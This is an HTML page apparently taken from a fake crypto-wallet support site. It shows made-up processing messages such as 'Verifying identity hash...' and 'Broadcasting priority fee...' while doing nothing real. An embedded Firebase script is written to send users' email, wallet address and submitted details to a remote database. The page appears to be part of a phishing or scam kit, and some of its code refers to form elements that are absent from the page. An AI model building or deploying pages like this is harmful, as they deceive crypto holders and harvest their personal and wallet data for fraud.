<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resolution</title>
    <style>
        body { margin: 0; background-color: #000; color: white; font-family: system-ui, -apple-system, sans-serif; padding: 20px; max-width: 600px; margin: 0 auto; }
        h1 { font-size: 24px; text-align: center; margin-bottom: 20px; }
        .status-box { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .status-icon { font-size: 40px; margin-bottom: 10px; display: block; }
        button { width: 100%; background: #2563eb; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .back-link { display: block; text-align: center; margin-top: 20px; color: gray; text-decoration: none; }
    </style>
</head>
<body>
    <h1 id="issue-header">Processing...</h1>
    
    <div class="status-box">
        <span class="status-icon">⚙️</span>
        <p id="status-text">Analyzing blockchain data...</p>
    </div>

    <button onclick="alert('Ticket Created!')">Submit for Review</button>
    
    <a href="issues.html" class="back-link">← Choose another issue</a>

    <script>
        // Simple logic to change content based on URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const type = urlParams.get('type');
        
        if(type === 'locked') {
            document.getElementById('issue-header').innerText = "Wallet Lock Detected";
            document.getElementById('status-text').innerText = "Verifying identity hash...";
        } else if (type === 'pending') {
            document.getElementById('issue-header').innerText = "Transaction Stuck";
            document.getElementById('status-text').innerText = "Broadcasting priority fee...";
        } else {
            document.getElementById('issue-header').innerText = "Recovery Protocol";
            document.getElementById('status-text').innerText = "Initializing secure key exchange...";
        }
    </script>
    <!-- FIREBASE LOGIC FOR RESOLUTION.HTML -->
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
  authDomain: "coinsupport-8b036.firebaseapp.com",
  databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "coinsupport-8b036",
  storageBucket: "coinsupport-8b036.firebasestorage.app",
  messagingSenderId: "575774102570",
  appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
  measurementId: "G-YGCSNX4H9L"
};

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Select DOM elements
    const form = document.getElementById('resolutionForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnIcon = document.getElementById('btnIcon');
    const spinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMessage');

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            // UI Loading State
            submitBtn.disabled = true;
            btnText.textContent = "Saving Resolution...";
            btnIcon.classList.add('hidden');
            spinner.classList.remove('hidden');
            statusMsg.textContent = "";

            // Gather Data
            const resolutionType = document.getElementById('resolutionType').value;
            const details = document.getElementById('details').value.trim();
            
            // Try to get wallet address from LocalStorage (if coming from previous steps)
            // Otherwise, try to grab it from an input field on this page if it exists
            let walletAddress = localStorage.getItem('selectedWallet') || '';
            const walletInput = document.getElementById('walletAddress');
            if (walletInput && !walletAddress) {
                walletAddress = walletInput.value.trim();
            }

            const email = localStorage.getItem('supportEmail') || '';

            try {
                // Create a unique reference for this resolution
                const newResolutionRef = push(ref(db), 'resolutions');
                
                // Save data to Firebase
                await set(newResolutionRef, {
                    email: email,
                    walletAddress: walletAddress,
                    resolutionType: resolutionType,
                    details: details,
                    timestamp: new Date().toISOString(),
                    status: 'completed'
                });

                // Success State
                btnText.textContent = "Saved!";
                submitBtn.style.background = "#22c55e"; // Green

                setTimeout(() => {
                    window.location.href = "confirmation.html";
                }, 1000);

            } catch (error) {
                console.error("Firebase Error:", error);
                btnText.textContent = "Error";
                submitBtn.style.background = "#ef4444"; // Red
                statusMsg.textContent = "Failed to save resolution. Please try again.";
                statusMsg.className = "text-center text-sm mt-2 h-5 text-red-500";
                
                // Reset button after delay
                setTimeout(() => {
                    submitBtn.disabled = false;
                    btnText.textContent = "Submit Resolution";
                    btnIcon.classList.remove('hidden');
                    spinner.classList.add('hidden');
                    submitBtn.style.background = ""; 
                }, 2000);
            }
        });
    }
</script>
</body>
</html>
